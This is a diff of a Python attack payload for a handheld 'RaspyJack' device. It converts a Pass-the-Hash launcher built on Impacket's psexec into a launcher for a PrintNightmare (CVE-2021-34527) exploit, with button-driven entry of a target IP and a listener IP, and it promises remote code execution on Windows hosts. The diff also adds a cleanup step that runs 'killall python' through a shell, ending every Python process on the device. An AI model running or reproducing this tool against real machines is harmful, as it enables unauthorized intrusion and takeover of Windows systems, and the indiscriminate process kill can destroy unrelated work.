@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 """
-RaspyJack *payload* – **Pass the Hash Attack**
-==============================================
-This payload performs a Pass the Hash attack, which allows an attacker
-to authenticate to a remote server by using the user's NTLM hash instead
-of their password.
+RaspyJack *payload* – **PrintNightmare Attack**
+===============================================
+This payload performs a PrintNightmare attack (CVE-2021-34527) against a
+vulnerable Windows machine.
+
+**NOTE:** This is a very powerful exploit that can cause serious damage.
+Use with extreme caution.
 
 Features:
-- Interactive UI for entering the target IP, username, and NTLM hash.
-- Uses Impacket's psexec.py to perform the attack.
+- Exploits the vulnerability to gain remote code execution.
 - The attack runs in a background thread.
 - Graceful exit via KEY3 or Ctrl-C.
 
@@ -16,7 +17,7 @@ Controls:
 - MAIN SCREEN:
     - OK: Start the attack.
     - KEY1: Edit the target IP.
-    - KEY2: Edit the username and hash.
+    - KEY2: Edit the listener IP.
     - KEY3: Exit Payload.
 """
 
@@ -37,8 +38,7 @@ import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
 TARGET_IP = "192.168.1.100"
-USERNAME = "Administrator"
-NTLM_HASH = "00000000000000000000000000000000:00000000000000000000000000000000"
+LISTENER_IP = "192.168.1.200"
 running = True
 attack_thread = None
 
@@ -53,6 +53,9 @@ FONT = ImageFont.load_default()
 def cleanup(*_):
     global running
     running = False
+    
+    # Kill all the processes
+    subprocess.run("killall python", shell=True)
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
@@ -60,7 +63,7 @@ signal.signal(signal.SIGTERM, cleanup)
 def draw_ui(screen_state="main", message_lines=None):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    d.text((5, 5), "Pass the Hash Attack", font=FONT_TITLE, fill="#00FF00")
+    d.text((5, 5), "PrintNightmare Attack", font=FONT_TITLE, fill="#00FF00")
     d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
 
     if message_lines:
@@ -75,30 +78,30 @@ def draw_ui(screen_state="main", message_lines=None):
             y_offset += 12
     elif screen_state == "main":
         d.text((5, 30), f"Target: {TARGET_IP}", font=FONT, fill="white")
-        d.text((5, 50), f"User: {USERNAME}", font=FONT, fill="white")
-        d.text((5, 70), f"Hash: {NTLM_HASH[:10]}...", font=FONT, fill="white")
+        d.text((5, 50), f"Listener: {LISTENER_IP}", font=FONT, fill="white")
         d.text((5, 100), "OK=Attack", font=FONT, fill="cyan")
-        d.text((5, 110), "KEY1=Target | KEY2=User/Hash", font=FONT, fill="cyan")
+        d.text((5, 110), "KEY1=Target | KEY2=Listener", font=FONT, fill="cyan")
     elif screen_state == "attacking":
         d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
         d.text((5, 70), f"Target: {TARGET_IP}", font=FONT, fill="white")
-        d.text((5, 85), f"User: {USERNAME}", font=FONT, fill="white")
+        d.text((5, 85), f"Listener: {LISTENER_IP}", font=FONT, fill="white")
 
     LCD.LCD_ShowImage(img, 0, 0)
 
 def run_attack():
     draw_ui("attacking")
     
-    # Path to psexec.py
-    psexec_path = os.path.join(RASPYJACK_ROOT, "impacket-examples", "psexec.py")
+    # Path to PrintNightmare exploit
+    printnightmare_path = os.path.join(RASPYJACK_ROOT, "printnightmare-exploit", "printnightmare.py")
     
     # Command to execute
     command = [
         "python3",
-        psexec_path,
-        "-hashes",
-        NTLM_HASH,
-        f"{USERNAME}@{TARGET_IP}"
+        printnightmare_path,
+        "-t",
+        TARGET_IP,
+        "-l",
+        LISTENER_IP
     ]
     
     try:
@@ -119,10 +122,7 @@ def run_attack():
     time.sleep(3)
 
 def handle_text_input_logic(initial_text, text_type):
-    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-:"
-    if text_type == "Target IP":
-        char_set = "0123456789."
-        
+    char_set = "0123456789."
     char_index = 0
     input_text = ""
     
@@ -186,13 +186,9 @@ if __name__ == "__main__":
                 time.sleep(0.3)
 
             if GPIO.input(PINS["KEY2"]) == 0:
-                new_username = handle_text_input_logic(USERNAME, "Username")
-                if new_username:
-                    USERNAME = new_username
-                
-                new_hash = handle_text_input_logic(NTLM_HASH, "NTLM Hash")
-                if new_hash:
-                    NTLM_HASH = new_hash
+                new_ip = handle_text_input_logic(LISTENER_IP, "Listener IP")
+                if new_ip:
+                    LISTENER_IP = new_ip
                 time.sleep(0.3)
 
             if GPIO.input(PINS["KEY3"]) == 0:
@@ -207,4 +203,4 @@ if __name__ == "__main__":
         cleanup()
         LCD.LCD_Clear()
         GPIO.cleanup()
-        print("Pass the Hash Attack payload finished.")
+        print("PrintNightmare Attack payload finished.")
